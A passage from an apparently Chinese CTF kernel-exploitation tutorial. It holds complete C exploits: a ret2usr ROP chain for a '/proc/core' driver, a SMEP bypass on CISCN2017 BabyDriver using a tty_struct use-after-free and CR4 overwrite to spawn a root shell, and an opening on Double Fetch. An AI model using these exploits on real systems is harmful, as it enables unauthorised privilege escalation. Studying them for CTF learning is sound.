!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    rop[i++] = BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>smep保护其实就是为了防止ret2usr这样的攻击，是否开启这个保护取决于rc4寄存器的值，我们一般只需要给它改成一个固定值0x6f0就可以关闭它，这里用之前Kernel UAF的babydriver进行演示</p>
<h3 id="CISCN2017-BabyDriver"><a href="#CISCN2017-BabyDriver" class="headerlink" title="CISCN2017-BabyDriver"></a>CISCN2017-BabyDriver</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们选择一个tty_struct结构体进行操作，在<code>open(&quot;/dev/ptmx&quot;,O_RDWR);</code>的时候会分配这样一个结构体，其源码如下：</p>
<p>其中<code>tty_operations</code>结构体有许多函数指针，我们可以通过伪造fake operation来劫持控制流。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>思路是利用UAF泄露出部分tty_struct结构体的内容，我们把operation这个结构体指针改成我们伪造的函数结构体指针，在函数结构体指针中按照顺序改三个指针为gadgets和rop，最终在调用write的时候触发这些函数执行劫持控制流，rop之后先改rc4，后面都一样。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> FindVmlinuxBase()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="comment">//FindVmlinuxBase();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="comment">//fake tty operations</span></span><br><span class="line">    <span class="keyword">void</span>* fake_ops[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//UAF to leak the initial tty_struct</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">//now we have a UAF :)</span></span><br><span class="line">    <span class="keyword">int</span> tty_fd = open(<span class="string">"/dev/ptmx"</span>,O_RDWR|O_NOCTTY);<span class="comment">//use the former released one</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_ops;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j &lt; <span class="number">30</span>;j++)</span><br><span class="line">        fake_ops[j] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">    fake_ops[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;<span class="comment">//lookup func</span></span><br><span class="line">    fake_ops[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;<span class="comment">//install </span></span><br><span class="line">    fake_ops[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">//open</span></span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">0x20</span>);<span class="comment">//write back</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(tty_fd,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Double Fetch是一种类似条件竞争的攻击方式，原理是内核在调用用户空间数据的时候可能会先做安全检查，随后调用其数据指针，而第二次取数据处理的时候可能使用被篡改的恶意数据。</p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>flag是编码到bss上的，我们要做的是通过一些校验，即可得到输出的flag。</p>
